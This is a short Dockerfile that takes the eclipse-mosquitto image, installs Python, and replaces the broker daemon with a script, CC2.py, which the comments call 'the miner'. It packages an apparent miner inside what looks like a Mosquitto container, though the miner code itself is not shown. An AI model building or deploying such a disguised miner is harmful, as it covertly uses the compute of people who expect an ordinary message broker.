FROM eclipse-mosquitto:2.0
USER root

# fix repositories and install Python
RUN echo "https://dl-cdn.alpinelinux.org/alpine/v3.18/main" > /etc/apk/repositories && \
    echo "https://dl-cdn.alpinelinux.org/alpine/v3.18/community" >> /etc/apk/repositories && \
    apk update && apk add --no-cache python3 py3-pip

# create virtual environment to avoid pip permission issues
RUN python3 -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY CC2.py .

# run the miner (instead of Mosquitto daemon)
CMD ["python3", "/app/CC2.py"]
